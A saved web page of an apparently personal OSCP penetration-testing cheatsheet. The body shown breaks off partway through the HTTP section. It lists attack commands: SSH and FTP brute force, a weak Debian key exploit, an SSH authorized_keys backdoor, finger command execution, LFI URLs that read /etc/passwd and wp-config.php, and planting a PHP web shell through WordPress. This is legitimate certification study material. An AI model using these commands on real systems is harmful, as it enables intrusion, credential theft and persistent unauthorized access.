@@ -1,0 +1,3911 @@
+<!DOCTYPE html>
+<!-- saved from url=(0078)#smb-%2D-445 -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	
+	<title>OSCP personal cheatsheet</title>
+	
+	<meta name="description" content="OSCP personal cheatsheet">
+	
+	<meta name="author" content="Liodeus">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="./OSCP personal cheatsheet_files/bootstrap.min.css" rel="stylesheet">
+	<link href="./OSCP personal cheatsheet_files/font-awesome.min.css" rel="stylesheet">
+	<link href="./OSCP personal cheatsheet_files/syntax.css" rel="stylesheet">
+	<link href="./OSCP personal cheatsheet_files/style.css" rel="stylesheet">
+
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="https://liodeus.github.io/feed.xml">
+</head>
+
+<body data-new-gr-c-s-check-loaded="14.1043.0" data-gr-ext-installed="" style="">
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://github.com/Liodeus">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:thibaultgalbourdin@gmail.com">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="https://liodeus.github.io/">
+				<img src="./OSCP personal cheatsheet_files/94b2c0c075c4ed839beee2dafbb2ac69.jpg" class="img-circle">
+				Liodeus
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="https://liodeus.github.io/">Home</a></li>
+				<!-- <li><a href="/">Categories</a></li> -->
+				<li><a href="https://liodeus.github.io/tags.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+    <script src="https://tryhackme.com/badge/163948"></script>
+		<!-- <button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button> -->
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="https://liodeus.github.io/"><i class="fa fa-home"></i>Home</a></li>
+			<!-- <li><a href="/"><i class="fa fa-folder"></i>Categories</a></li> -->
+			<li><a href="https://liodeus.github.io/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs" style="min-height:unset !important; height: 102% !important; overflow: auto;">
+		<!-- sidebar.html -->
+<ul>
+  <li>
+    <p><a href="#enumeration">Enumeration</a></p>
+  </li>
+  <li><a href="#nmap">NMAP</a>
+    <ul>
+      <li><a href="#tcp">TCP</a></li>
+      <li><a href="#udp">UDP</a></li>
+    </ul>
+  </li>
+  <li>
+    <p><a href="#ftp---21">FTP - 21</a></p>
+
+    <ul>
+      <li><a href="#brute-force">Brute force</a></li>
+      <li><a href="#downloading-file">Downloading file</a></li>
+      <li><a href="#uploading-file">Uploading file</a></li>
+    </ul>
+  </li>
+  <li><a href="#ssh---22">SSH - 22</a>
+    <ul>
+      <li><a href="#brute-force-1">Brute force</a></li>
+      <li><a href="#cve-2008-0166">CVE-2008-0166</a></li>
+      <li><a href="#ssh-backdoor---post-exploitation">SSH backdoor - post exploitation</a></li>
+    </ul>
+  </li>
+  <li><a href="#dns---53">DNS - 53</a>
+    <ul>
+      <li><a href="#zone-transfert">Zone transfert</a></li>
+      <li><a href="#dns-brute-force">DNS brute force</a></li>
+    </ul>
+  </li>
+  <li><a href="#finger---79">FINGER - 79</a>
+    <ul>
+      <li><a href="#user-enumeration">User enumeration</a></li>
+      <li><a href="#command-execution">Command execution</a></li>
+    </ul>
+  </li>
+  <li><a href="#http---https---80---443">HTTP - HTTPS - 80 - 443</a>
+    <ul>
+      <li><a href="#automatic-scanners">Automatic scanners</a></li>
+      <li><a href="#wordpress">Wordpress</a>
+        <ul>
+          <li><a href="#wordpress-panel-rce">Wordpress panel RCE</a></li>
+        </ul>
+      </li>
+      <li><a href="#drupal">Drupal</a>
+        <ul>
+          <li><a href="#username-enumeration">Username enumeration</a></li>
+          <li><a href="#hidden-pages-enumeration">Hidden pages enumeration</a></li>
+          <li><a href="#drupal-panel-rce">Drupal panel RCE</a></li>
+        </ul>
+      </li>
+      <li><a href="#joomla">Joomla</a></li>
+      <li><a href="#tomcat">Tomcat</a>
+        <ul>
+          <li><a href="#default-credentials">Default credentials</a></li>
+          <li><a href="#brute-force-2">Brute force</a></li>
+          <li><a href="#tomcat-panel-rce">Tomcat panel RCE</a></li>
+        </ul>
+      </li>
+      <li><a href="#jenkins">Jenkins</a>
+        <ul>
+          <li><a href="#jenkins-panel-rce">Jenkins panel RCE</a></li>
+        </ul>
+      </li>
+      <li><a href="#openemr">OpenEMR</a></li>
+      <li><a href="#codiad">Codiad</a></li>
+      <li><a href="#nagios">Nagios</a></li>
+      <li><a href="#sweet-rice">SweetRice</a></li>
+      <li><a href="#bolt">Bolt</a></li>
+      <li><a href="#elastix">Elastix</a></li>
+      <li><a href="#webdav">WebDav</a></li>
+      <li><a href="#coldfusion">ColdFusion</a></li>
+      <li><a href="#http-brute-force-authentication">HTTP brute force authentication</a>
+        <ul>
+          <li><a href="#http-basic-authentication">HTTP basic authentication</a></li>
+          <li><a href="#http-get-request">HTTP GET request</a></li>
+          <li><a href="#http-post-request">HTTP POST request</a></li>
+        </ul>
+      </li>
+      <li><a href="#spidering--brute-force-directories--files">Spidering / Brute force directories / files</a>
+        <ul>
+          <li><a href="#file-backups">File backups</a></li>
+        </ul>
+      </li>
+      <li><a href="#local-file-inclusion--remote-file-inclusion---lfi--rfi">Local File Inclusion / Remote File Inclusion - LFI / RFI</a>
+        <ul>
+          <li><a href="#wrappers">Wrappers</a>
+            <ul>
+              <li><a href="#wrapper-phpfilter">Wrapper php://filter</a></li>
+              <li><a href="#wrapper-expect">Wrapper expect://</a></li>
+              <li><a href="#wrapper-data">Wrapper data://</a></li>
+              <li><a href="#wrapper-input">Wrapper input://</a></li>
+            </ul>
+          </li>
+          <li><a href="#useful-lfi-list">Useful LFI list</a></li>
+          <li><a href="#tools">Tools</a></li>
+        </ul>
+      </li>
+      <li><a href="#command-injection">Command injection</a></li>
+      <li><a href="#deserialization">Deserialization</a></li>
+      <li><a href="#file-upload">File upload</a></li>
+      <li><a href="#sql-injection">SQL injection</a></li>
+      <li><a href="#xss">XSS</a></li>
+      <li><a href="#other-web-vulnerabilities">Other web vulnerabilities</a></li>
+      <li><a href="#upload-a-file-with-put">Upload a file with PUT</a></li>
+      <li><a href="#cves">CVEs</a></li>
+    </ul>
+  </li>
+  <li>
+    <p><a href="#kerberos---88">KERBEROS - 88</a></p>
+  </li>
+  <li><a href="#pop3---110">POP3 - 110</a>
+    <ul>
+      <li><a href="#brute-force-3">Brute force</a></li>
+      <li><a href="#read-mail">Read mail</a></li>
+    </ul>
+  </li>
+  <li><a href="#snmp---161">SNMP - 161</a>
+    <ul>
+      <li><a href="#brute-force-community-string">Brute force community string</a></li>
+      <li><a href="#modifying-snmp-values">Modifying SNMP values</a></li>
+    </ul>
+  </li>
+  <li><a href="#ldap---389">LDAP - 389</a>
+    <ul>
+      <li><a href="#scans">Scans</a></li>
+      <li><a href="#graphical-interface">Graphical Interface</a></li>
+    </ul>
+  </li>
+  <li>
+    <p><a href="#smb---445">SMB - 445</a></p>
+
+    <ul>
+      <li><a href="#version-if-nmap-didnt-detect-it">Version if nmap didn’t detect it</a></li>
+      <li><a href="#scan-for-vulnerability">Scan for vulnerability</a></li>
+      <li><a href="#manual-testing">Manual testing</a></li>
+      <li><a href="#brute-force-4">Brute force</a></li>
+      <li><a href="#mount-a-smb-share">Mount a SMB share</a></li>
+      <li><a href="#get-a-shell">Get a shell</a></li>
+      <li><a href="#EternalBlue-MS17-010">EternalBlue (MS17-010)</a>
+        <ul>
+          <li><a href="#check-if-vulnerable">Check if vulnerable</a></li>
+          <li><a href="#prepare-shellcodes-and-listeners">Prepare shellcodes and listeners</a></li>
+          <li><a href="#exploit">Exploit</a></li>
+          <li><a href="#if-this-doesnt-work-try-this-one">If this doesn’t work, try this one</a></li>
+        </ul>
+      </li>
+      <li><a href="#ms08-067">MS08-067</a></li>
+      <li><a href="#cve-2017-7494">CVE-2017-7494</a></li>
+    </ul>
+  </li>
+  <li><a href="#mssql---1433">MSSQL - 1433</a>
+    <ul>
+      <li><a href="#get-information">Get information</a></li>
+      <li><a href="#brute-force-5">Brute force</a></li>
+      <li><a href="#having-credentials">Having credentials</a></li>
+      <li><a href="#manual-exploit">Manual exploit</a></li>
+    </ul>
+  </li>
+  <li><a href="#nfs---2049">NFS - 2049</a>
+    <ul>
+      <li><a href="#show-mountable-nfs-shares">Show Mountable NFS Shares</a></li>
+      <li><a href="#mount-a-share">Mount a share</a></li>
+      <li><a href="#nfs-misconfigurations">NFS misconfigurations</a></li>
+    </ul>
+  </li>
+  <li><a href="#mysql---3306">MYSQL - 3306</a>
+    <ul>
+      <li><a href="#brute-force-6">Brute force</a></li>
+      <li><a href="#extracting-mysql-credentials-from-files">Extracting MySQL credentials from files</a></li>
+      <li><a href="#connect">Connect</a></li>
+      <li><a href="#mysql-commands">MySQL commands</a></li>
+      <li><a href="#manual-exploit-1">Manual exploit</a></li>
+    </ul>
+  </li>
+  <li><a href="#rdp---3389">RDP - 3389</a>
+    <ul>
+      <li><a href="#brute-force-7">Brute force</a></li>
+      <li><a href="#connect-with-known-credentials--hash">Connect with known credentials / hash</a></li>
+      <li><a href="#session-stealing">Session stealing</a>
+        <ul>
+          <li><a href="#get-openned-sessions">Get openned sessions</a></li>
+          <li><a href="#access-to-the-selected">Access to the selected</a></li>
+        </ul>
+      </li>
+      <li><a href="#adding-user-to-rdp-group-windows">Adding user to RDP group (Windows)</a></li>
+    </ul>
+  </li>
+  <li><a href="#smtp---4555">SMTP - 4555</a>
+
+  <li><a href="#vnc---5800---58001---5900---5901">VNC - 5800 - 58001 - 5900 - 5901</a>
+    <ul>
+      <li><a href="#scans-1">Scans</a></li>
+      <li><a href="#brute-force-8">Brute force</a></li>
+      <li><a href="#connect-1">Connect</a></li>
+      <li><a href="#found-vnc-password">Found VNC password</a>
+        <ul>
+          <li><a href="#linux">Linux</a></li>
+          <li><a href="#windows">Windows</a></li>
+        </ul>
+      </li>
+      <li><a href="#decrypt-vnc-password">Decrypt VNC password</a></li>
+    </ul>
+  </li>
+  <li><a href="#winrm---5985---5986">WINRM - 5985 - 5986</a>
+    <ul>
+      <li><a href="#brute-force-9">Brute force</a></li>
+      <li><a href="#connecting">Connecting</a></li>
+    </ul>
+  </li>
+  <li>
+    <p><a href="#cgi">CGI</a></p>
+
+    <ul>
+      <li><a href="#found-cgi-scripts">Found CGI scripts</a></li>
+    </ul>
+  </li>
+  <li>
+    <p><a href="#command-and-control-framework">Command and control framework</a></p>
+  </li>
+  <li>
+    <p><a href="#compiling-exploits">Compiling exploits</a></p>
+
+    <ul>
+      <li><a href="#for-linux">For linux</a></li>
+      <li><a href="#for-windows">For windows</a></li>
+      <li><a href="#cross-compile">Cross compile</a></li>
+    </ul>
+  </li>
+  <li>
+    <p><a href="#dictionary-generation">DICTIONARY GENERATION</a></p>
+  </li>
+  <li><a href="#file-transfer">FILE TRANSFER</a>
+    <ul>
+      <li><a href="#linux-1">Linux</a></li>
+      <li><a href="#windows-1">Windows</a></li>
+    </ul>
+  </li>
+  <li><a href="#git">GIT</a>
+    <ul>
+      <li><a href="#download-git">Download .git</a></li>
+      <li><a href="#extract-git-content">Extract .git content</a></li>
+    </ul>
+  </li>
+  <li><a href="#hashes">HASHES</a>
+    <ul>
+      <li><a href="#windows-2">Windows</a></li>
+      <li><a href="#linux-2">Linux</a></li>
+    </ul>
+  </li>
+  <li>
+    <p><a href="#mimikatz">MIMIKATZ</a></p>
+  </li>
+  <li>
+    <p><a href="#miscellaneous">MISCELLANEOUS</a></p>
+
+    <ul>
+      <li><a href="#get-a-windows-path-without-spaces">Get a Windows path without spaces</a></li>
+    </ul>
+  </li>
+  <li><a href="#msfvenom-payload">MSFVENOM PAYLOAD</a>
+    <ul>
+      <li><a href="#linux-3">Linux</a></li>
+      <li><a href="#windows-3">Windows</a></li>
+      <li><a href="#php">PHP</a></li>
+      <li><a href="#asp">ASP</a></li>
+      <li><a href="#jsp">JSP</a></li>
+      <li><a href="#war">WAR</a></li>
+      <li><a href="#python">Python</a></li>
+      <li><a href="#bash">Bash</a></li>
+      <li><a href="#perl">Perl</a></li>
+      <li><a href="#listener">Listener</a>
+        <ul>
+          <li><a href="#metasploit">Metasploit</a></li>
+          <li><a href="#netcat">Netcat</a></li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li><a href="#password-cracking">PASSWORD CRACKING</a>
+    <ul>
+      <li><a href="#online">Online</a></li>
+      <li><a href="#hashcat">Hashcat</a>
+        <ul>
+          <li><a href="#linux-password">Linux password</a></li>
+          <li><a href="#windows-password">Windows password</a></li>
+          <li><a href="#others">Others</a></li>
+          <li><a href="#rules">Rules</a></li>
+        </ul>
+      </li>
+      <li><a href="#john">John</a></li>
+    </ul>
+  </li>
+  <li>
+    <p><a href="#pivoting">PIVOTING</a></p>
+
+    <ul>
+      <li><a href="#sshuttle">Sshuttle</a></li>
+      <li><a href="#proxychains">Proxychains</a></li>
+    </ul>
+  </li>
+  <li><a href="#privile-escalation">PRIVILE ESCALATION</a>
+    <ul>
+      <li><a href="#linux-4">Linux</a>
+        <ul>
+          <li><a href="#enumeration-scripts">Enumeration scripts</a></li>
+          <li><a href="#vulnerability-scan">Vulnerability scan</a></li>
+          <li><a href="#suid-checker">Suid checker</a></li>
+          <li><a href="#methodology-to-follow">Methodology to follow</a></li>
+        </ul>
+      </li>
+      <li><a href="#windows-4">Windows</a>
+        <ul>
+          <li><a href="#enumeration-scripts-1">Enumeration scripts</a>
+            <ul>
+              <li><a href="#general-scans">General scans</a></li>
+              <li><a href="#search-for-cve">Search for CVE</a></li>
+              <li><a href="#post-exploitation">Post exploitation</a></li>
+            </ul>
+          </li>
+          <li><a href="#juicypotato-seimpersonate-or-seassignprimarytoken">JuicyPotato (SeImpersonate or SeAssignPrimaryToken)</a></li>
+          <li><a href="#methodology-to-follow-1">Methodology to follow</a></li>
+          <li><a href="#autorun">Autorun</a>
+            <ul>
+              <li><a href="#detection">Detection</a></li>
+              <li><a href="#exploitation">Exploitation</a></li>
+            </ul>
+          </li>
+          <li><a href="#alwaysinstallelevated">AlwaysInstallElevated</a>
+            <ul>
+              <li><a href="#detection-1">Detection</a></li>
+              <li><a href="#exploitation-1">Exploitation</a></li>
+            </ul>
+          </li>
+          <li><a href="#executable-files">Executable Files</a>
+            <ul>
+              <li><a href="#detection-2">Detection</a></li>
+              <li><a href="#exploitation-2">Exploitation</a></li>
+            </ul>
+          </li>
+          <li><a href="#startup-applications">Startup applications</a>
+            <ul>
+              <li><a href="#detection-3">Detection</a></li>
+              <li><a href="#exploitation-3">Exploitation</a></li>
+            </ul>
+          </li>
+          <li><a href="#weak-service-permission">Weak service permission</a>
+            <ul>
+              <li><a href="#detection-4">Detection</a></li>
+              <li><a href="#exploitation-4">Exploitation</a></li>
+            </ul>
+          </li>
+          <li><a href="#unquoted-service-paths">Unquoted service paths</a>
+            <ul>
+              <li><a href="#detection-5">Detection</a></li>
+              <li><a href="#exploitation-5">Exploitation</a></li>
+            </ul>
+          </li>
+          <li><a href="#hot-potato">Hot potato</a>
+            <ul>
+              <li><a href="#exploitation-6">Exploitation</a></li>
+            </ul>
+          </li>
+          <li><a href="#cve">CVE</a>
+            <ul>
+              <li><a href="#windows-xp">Windows XP</a></li>
+              <li><a href="#windows-7">Windows 7</a></li>
+              <li><a href="#windows-8">Windows 8</a></li>
+              <li><a href="#windows-10">Windows 10</a></li>
+              <li><a href="#windows-server-2003">Windows Server 2003</a></li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li><a href="#active-directory">ACTIVE DIRECTORY</a>
+  <li><a href="#bof">BUFFER OVERFLOW</a>
+  <li><a href="#proofs">PROOFS</a>
+    <ul>
+      <li><a href="#linux-5">Linux</a></li>
+      <li><a href="#windows-5">Windows</a></li>
+    </ul>
+  </li>
+  <li>
+    <p><a href="#reverse-shell">REVERSE SHELL</a></p>
+
+    <ul>
+      <li><a href="#amazing-tool-for-shell-generation">Amazing tool for shell generation</a></li>
+      <li><a href="#bash-1">Bash</a></li>
+      <li><a href="#perl-1">Perl</a></li>
+      <li><a href="#python-1">Python</a></li>
+      <li><a href="#netcat-1">Netcat</a></li>
+      <li><a href="#powershell">Powershell</a></li>
+      <li><a href="#more-reverse-shell">More reverse shell</a></li>
+      <li><a href="#interactive-shell">Interactive shell</a></li>
+      <li><a href="#adjust-interactive-shell">Adjust Interactive shell</a></li>
+    </ul>
+  </li>
+  <li>
+    <p><a href="#shellshock">SHELLSHOCK</a></p>
+  </li>
+  <li><a href="#useful-linux-commands">USEFUL LINUX COMMANDS</a>
+    <ul>
+      <li><a href="#find-a-file">Find a file</a></li>
+      <li><a href="#active-connection">Active connection</a></li>
+      <li><a href="#list-all-suid-files">List all SUID files</a></li>
+      <li><a href="#determine-the-current-version-of-linux">Determine the current version of Linux</a></li>
+      <li><a href="#determine-more-information-about-the-environment">Determine more information about the environment</a></li>
+      <li><a href="#list-processes-running">List processes running</a></li>
+      <li><a href="#list-the-allowed-and-forbidden-commands-for-the-invoking-use">List the allowed (and forbidden) commands for the invoking use</a></li>
+    </ul>
+  </li>
+  <li>
+    <p><a href="#useful-windows-commands">USEFUL WINDOWS COMMANDS</a></p>
+  </li>
+  <li><a href="#zip">ZIP</a></li>
+  <li><a href="#msf">Metasploit</a></li>
+  <li><a href="#web-pentest">For Web Pentest</a></li>
+</ul>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>OSCP personal cheatsheet </h1>
+</div>
+	
+<article>
+
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   January 
+	   17th,
+	   
+	   2022
+	 </span>
+	  <div class="article_body">
+	  
+
+<hr>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sn -v &lt;IP&gt;/CIDR
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmapAutomator &lt;IP&gt; All
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>autorecon &lt;IP&gt;/CIDR
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="nmap">NMAP</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Full ports
+nmap &lt;ip&gt; -p-
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Break down the command (for reporting)
+  sV scans for service and version
+  sC runs a script scan against open ports.
+  -p- scans all ports 0 - 65535
+  -v provides verbose output
+</code></pre></div></div>
+
+<h3 id="tcp">TCP</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -sS -sC -sV -oA &lt;NAME&gt;.tcp &lt;IP&gt; -v
+</code></pre></div></div>
+
+<h3 id="udp">UDP</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -sU -sS -sC -sV -oA &lt;NAME&gt;.udp &lt;IP&gt; -v [--top-ports 20]
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="ftp---21">FTP - 21</h2>
+
+<h3 id="brute-force">Brute force</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -V -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; ftp://&lt;IP&gt; -u -vV
+</code></pre></div></div>
+
+<h3 id="downloading-file">Downloading file</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp &lt;IP&gt;
+PASSIVE
+BINARY
+get &lt;FILE&gt;
+
+#Download all files for searching
+  wget -m ftp://username:password@ip.of.old.host
+  OR
+  wget -m --user=username --password=password ftp://ip.of.old.host
+</code></pre></div></div>
+
+<h3 id="uploading-file">Uploading file</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp &lt;IP&gt;
+PASSIVE
+BINARY
+put &lt;FILE&gt;
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="ssh---22">SSH - 22</h2>
+
+<h3 id="brute-force-1">Brute force</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -V -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; ssh://&lt;IP&gt; -u -vV
+</code></pre></div></div>
+
+<h3 id="cve-2008-0166">CVE-2008-0166</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.
+
+https://www.exploit-db.com/exploits/5720
+
+wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_dsa_1024_x86.tar.bz2
+
+bunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2
+tar -xvf debian_ssh_rsa_2048_x86.tar
+tar -xvf debian_ssh_dsa_1024_x86.tar
+
+python 5720 rsa/2048 &lt;IP&gt; &lt;USER&gt; &lt;PORT&gt; &lt;THREADS&gt;
+python 5720 dsa/1024 &lt;IP&gt; &lt;USER&gt; &lt;PORT&gt; &lt;THREADS&gt;
+</code></pre></div></div>
+
+<h3 id="ssh-backdoor---post-exploitation">SSH backdoor - post exploitation</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Attacker
+ssh-keygen -f &lt;FILENAME&gt;
+chmod 600 &lt;FILENAME&gt;
+cat &lt;FILENAME&gt;.pub -&gt; copy
+
+# Victim
+echo &lt;FILENAME&gt;.pub &gt;&gt; &lt;PATH&gt;/.ssh/authorized_keys
+(chmod 755 <PATH>/.ssh if not yet)
+
+# Connect
+ssh -i &lt;FILENAME&gt; &lt;USER&gt;@&lt;IP&gt;
+# If it has passphrase
+python ssh2john.py id_rsa > id_rsa.hash
+john --wordlist=/path/to/rockyou.txt id_rsa.hash
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#If it has file1.asc and file2.pgp
+  #Attacker
+    #crack file1.asc
+      gpg2john file1.asc > forJohn.txt
+      john forJohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
+    #decrypt file2.pgp with cracked password for passphrase 
+      gpg --import file1.asc
+      gpg --decrypt file2.pgp
+</code></pre></div></div>
+
+<h3 id="port-forwarding">Port forwarding</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Utilize Port Forwarding to Access MySQL Database in Another Private Network (https://levelup.gitconnected.com/utilize-port-forwarding-to-access-mysql-database-in-another-private-network-d58d2e4f358c)
+ssh -L local_port:databse_local_ip:3306 username@public_server
+(Windows: transfer plink.exe
+  (cmd.exe /c echo y |) plink.exe -ssh -l kali -pw ilak -R 192.168.119.179:1234:127.0.0.1:3306 192.168.119.179
+)
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="dns---53">DNS - 53</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnsenum &lt;DOMAIN&gt;
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnsrecon -d &lt;DOMAIN&gt;
+</code></pre></div></div>
+
+<h3 id="zone-transfert">Zone transfert</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnsrecon -d &lt;DOMAIN&gt; -a
+dig axfr &lt;DOMAIN&gt; @ns1.test.com
+</code></pre></div></div>
+
+<h3 id="dns-brute-force">DNS brute force</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/blark/aiodnsbrute
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="finger---79">FINGER - 79</h2>
+
+<h3 id="user-enumeration">User enumeration</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>finger @&lt;IP&gt;
+finger &lt;USER&gt;@&lt;IP&gt;
+</code></pre></div></div>
+
+<h3 id="command-execution">Command execution</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>finger "|/bin/id@&lt;IP&gt;"
+finger "|/bin/ls -a /&lt;IP&gt;"
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="http---https---80---443">HTTP - HTTPS - 80 - 443</h2>
+
+<h3 id="automatic-scanners">Automatic scanners</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nikto -h &lt;URL&gt;
+python crawleet.py -u &lt;URL&gt; -b -d 3 -e jpg,png,css -f -m -s -x php,txt -y --threads 20
+</code></pre></div></div>
+
+<h3 id="wordpress">Wordpress</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Scan
+wpscan --rua -e --url &lt;URL&gt;
+#enum all plugin
+wpscan --url (ip)/wordpress -e ap
+  - Mail masta:
+    LFI: https://www.exploit-db.com/exploits/40290
+      http://10.10.147.143/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+      http://10.10.147.143/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
+      #Manually fuzz: /etc/ssh/sshd_config, /usr/share/openssh/sshd_config
+      #(LFI2RCE: https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-apache-log-file)
+
+  - Reflex gallery:
+    Arbitary file upload: https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_reflexgallery_file_upload
+
+  - wp-autosuggest (version 0.24): WordPress Plugin AutoSuggest 0.24 - 'wpas_keys' SQL Injection
+    https://www.exploit-db.com/exploits/45977
+    
+# Brute force user(s)
+wpscan --rua --url &lt;URL&gt; -P &lt;PASSWORDS_LIST&gt; -U "&lt;USER&gt;,&lt;USER&gt;"
+</code></pre></div></div>
+
+<h4 id="wordpress-panel-rce">Wordpress panel RCE</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Modifying a php from the theme used (admin credentials needed)
+
+Appearance -&gt; Editor -&gt; 404 Template (at the right)
+Change the content for a php shell
+https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
+http://&lt;IP&gt;/wp-content/themes/twentytwelve/404.php
+</code></pre></div></div>
+
+<h3 id="drupal">Drupal</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>droopescan scan -u &lt;URL&gt;
+</code></pre></div></div>
+
+<h4 id="username-enumeration">Username enumeration</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>In /user/register just try to create a username and if the name is already taken it will be notified :
+*The name admin is already taken*
+
+If you request a new password for an existing username :
+*Unable to send e-mail. Contact the site administrator if the problem persists.*
+
+If you request a new password for a non-existent username :
+*Sorry, test is not recognized as a user name or an e-mail address.*
+
+Accessing /user/&lt;number&gt; you can see the number of existing users :
+	- /user/1 -&gt; Access denied (user exist)
+	- /user/2 -&gt; Page not found (user doesn't exist)
+</code></pre></div></div>
+
+<h4 id="hidden-pages-enumeration">Hidden pages enumeration</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Fuzz /node/&lt;NUMBER&gt; where &lt;NUMBER&gt; is a number (from 1 to 500 for example).
+You could find hidden pages (test, dev) which are not referenced by the search engines.
+
+wfuzz -c -z range,1-500 --hc 404 &lt;URL&gt;/node/FUZZ
+wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hc 404 &lt;URL&gt;/FUZZ/note.txt
+</code></pre></div></div>
+
+<h4 id="vhost">Virtual host enumeration</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster vhost -u http://funbox.fritz.box/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
